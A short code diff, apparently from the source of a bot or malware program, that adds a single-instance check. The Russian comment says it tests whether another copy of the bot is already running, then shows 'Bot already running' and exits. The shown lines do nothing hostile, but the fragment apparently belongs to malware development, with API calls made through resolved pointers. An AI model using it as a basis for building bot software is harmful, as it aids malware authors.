@@ -248,6 +248,14 @@ int APIENTRY MyMain()
 {
 	BOT::Initialize();
 
+	// Проверяем не запущен ли на данном компьютере другой экземпляр бота
+	if (BOT::IsRunning())
+	{
+		pMessageBoxA(NULL, "Бот уже запущен", NULL, 0);
+		pExitProcess(0);
+		return 0; // Паранойя :)
+	}
+
 
 	DWORD* pVirtualAddr = (DWORD*)MagicValue;
 
